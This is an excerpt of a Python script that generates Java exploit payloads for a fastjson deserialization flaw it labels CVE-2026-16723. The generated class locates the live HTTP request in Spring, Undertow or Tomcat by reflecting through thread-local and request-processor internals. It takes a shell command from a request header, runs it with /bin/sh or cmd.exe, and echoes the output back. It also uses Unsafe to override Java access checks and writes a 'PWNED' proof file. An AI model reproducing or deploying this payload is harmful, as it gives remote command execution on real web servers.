...
ECHO_ENGINES = ("auto", "spring", "undertow", "tomcat")
# CLI -m 短名 -> 内部模式名
...
def build_payload_src(
    ...
    proof_lit = _java_string_literal(proof_path)
    cmd_header_lit = _java_string_literal(cmd_header)
    engine_lit = _java_string_literal(echo_engine)

    if echo:
        # Echo techniques adapted from pen4uin/java-echo-generator (ThreadLocal / RequestGroupInfo),
        # plus Unsafe setAccessible fallback for JDK12+. Compile needs fastjson only.
        return f"""\
import com.alibaba.fastjson.annotation.JSONType;
...
public class WriteFileJType {{
    ...
    private static void doEcho() throws Exception {{
        ...
        String cmd = (String) invoke(request, "getHeader", new Class[]{{String.class}}, new Object[]{{"{cmd_header_lit}"}});
        ...
        try {{
            try {{
                invoke(response, "resetBuffer", new Class[0], new Object[0]);
            }} catch (Throwable ignore) {{
            }}
            try {{
                invoke(response, "setStatus", new Class[]{{int.class}}, new Object[]{{Integer.valueOf(200)}});
            }} catch (Throwable ignore) {{
            }}
            try {{
                invoke(response, "setContentType", new Class[]{{String.class}}, new Object[]{{"text/plain;charset=UTF-8"}});
            }} catch (Throwable ignore) {{
            }}
            ...
            w.flush();
            try {{
                invoke(response, "flushBuffer", new Class[0], new Object[0]);
            }} catch (Throwable ignore) {{
            }}
        }} catch (Throwable ignore) {{
        }}
    ...
    // ---- undertow: current() then ThreadLocal table walk (jEG Undertow) ----
    ...
    private static Object[] fromUndertowThreadLocal() {{
        try {{
            ...
            for (int i = 0; i < len; i++) {{
                ...
                if (cn.contains("ServletRequestContext")) {{
    ...
    // ---- tomcat: jEG RequestGroupInfo path (JDK12+ friendly), then WRAP fallback ----
    ...
    private static Object[] fromTomcatProcessors() {{
        try {{
            ...
            for (int i = 0; i < threads.length; i++) {{
                ...
                try {{
                    cur = getField(cur, "endpoint");
                }} catch (Throwable e) {{
                    cur = getField(cur, "this$0");
                }}
                try {{
                    cur = getField(cur, "handler");
                }} catch (Throwable e1) {{
                    try {{
                        cur = getField(cur.getClass().getSuperclass(), cur, "handler");
                    }} catch (Throwable e2) {{
                        cur = getField(cur.getClass().getSuperclass().getSuperclass(), cur, "handler");
                    }}
                }}
                try {{
                    cur = getField(cur, "global");
                }} catch (Throwable e) {{
                    cur = getField(cur.getClass().getSuperclass(), cur, "global");
                }}
                if (cur == null || !cur.getClass().getName().contains("RequestGroupInfo")) {{
                    continue;
                }}
                ...
                for (int j = 0; j < processors.size(); j++) {{
                    ...
                    String hdr;
                    try {{
                        hdr = (String) invoke(coyoteReq, "getHeader", new Class[]{{String.class}}, new Object[]{{"{cmd_header_lit}"}});
                    }} catch (Throwable e) {{
                        continue;
                    }}
                    if (hdr == null) {{
                    ...
                    // Prefer servlet request facade when available
    ...
    // Legacy JDK8 path; uses Unsafe when Field.modifiers is gone (JDK12+)
    private static Object[] fromTomcatWrapSameObject() {{
        try {{
            ...
            if (!wrapOn || reqTL == null || respTL == null) {{
                ...
                if (reqTL == null) {{
                    setFieldValue(reqF, null, new ThreadLocal());
                }}
                if (respTL == null) {{
                    setFieldValue(respF, null, new ThreadLocal());
                }}
                try {{
                    Files.write(Paths.get("{proof_lit}"),
                        ("CVE-2026-16723-FD-CACHE-PWNED\\nmode=tomcat-prime\\n").getBytes(StandardCharsets.UTF_8));
                }} catch (Throwable ignore) {{
                }}
                return null;
            }}
    ...
    private static byte[] exec(String cmd) throws Exception {{
        ...
        String[] cmds = linux ? new String[]{{"/bin/sh", "-c", cmd}} : new String[]{{"cmd.exe", "/c", cmd}};
    ...
    private static void forceAccess(AccessibleObject ao) throws Exception {{
        ...
        // JDK12+/17: set AccessibleObject.override via Unsafe
        Object unsafe = getUnsafe();
        Field override = AccessibleObject.class.getDeclaredField("override");
        long off = ((Long) unsafe.getClass().getMethod("objectFieldOffset", Field.class).invoke(unsafe, override)).longValue();
